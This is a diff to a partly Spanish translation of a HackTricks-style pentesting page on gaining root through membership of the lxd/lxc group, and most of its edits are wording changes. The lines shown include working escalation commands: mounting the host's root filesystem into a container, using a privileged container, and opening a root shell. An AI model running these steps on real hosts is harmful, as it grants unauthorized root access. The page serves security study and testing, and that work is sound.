@@ -1,14 +1,16 @@
-# Grupo lxd/lxc - Escalada de privilegios
+# lxd/lxc Group - Escalada de privilegios
 
-La pertenencia al grupo de gestión de LXD del host (normalmente _**lxd**_) puede proporcionar una vía hacia root al permitir el control total del daemon.<sup>[[1]](#references)</sup>
+{{#include ../../../banners/hacktricks-training.md}}
 
-## Explotación sin Internet
+La pertenencia al grupo de administración de LXD del host (normalmente _**lxd**_) puede proporcionar una vía para obtener root al permitir el control total del daemon.<sup>[[1]](#references)</sup>
 
-### Método 1
+## Explotación sin internet
+
+### Method 1
 
 Puedes descargar una imagen de Alpine para usarla con LXD desde un repositorio de confianza.  
 El servidor de imágenes de LXD de Canonical publica compilaciones diarias: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
-Solo tienes que obtener **lxd.tar.xz** y **rootfs.squashfs** de la compilación más reciente (el nombre del directorio es la fecha).<sup>[[8]](#references)</sup>
+Solo tienes que descargar **lxd.tar.xz** y **rootfs.squashfs** de la compilación más reciente (el nombre del directorio es la fecha).<sup>[[8]](#references)</sup>
 
 Como alternativa, puedes instalar distrobuilder en tu máquina siguiendo las [instrucciones del proyecto](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
@@ -49,10 +51,10 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> Si encuentras este error _**Error: No storage pool found. Please create a new storage pool**_\
-> Ejecuta **`lxd init`**, configura un storage pool predeterminado y, a continuación, **repite el bloque anterior de comandos**.<sup>[[2]](#references)</sup>
+> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
+> Run **`lxd init`**, set up a default storage pool, then **repeat** the previous chunk of commands.<sup>[[2]](#references)</sup>
 
-Finalmente, inicia el contenedor y abre un root shell en el sistema de archivos del host:<sup>[[1]](#references)[[2]](#references)</sup>
+Finalmente, inicia el container y abre un shell de root en el filesystem del host:<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -60,7 +62,7 @@ lxc exec privesc /bin/sh
 ```
 ### Método 2
 
-Construye una imagen de Alpine e iníciala con el flag `security.privileged=true`, que asigna el root del container al root del host; montar `/` expone entonces el filesystem del host dentro del container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
+Construye una imagen Alpine e iníciala con el flag `security.privileged=true`, que asigna el root del contenedor al root del host; montar `/` expone entonces el sistema de archivos del host dentro del contenedor.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
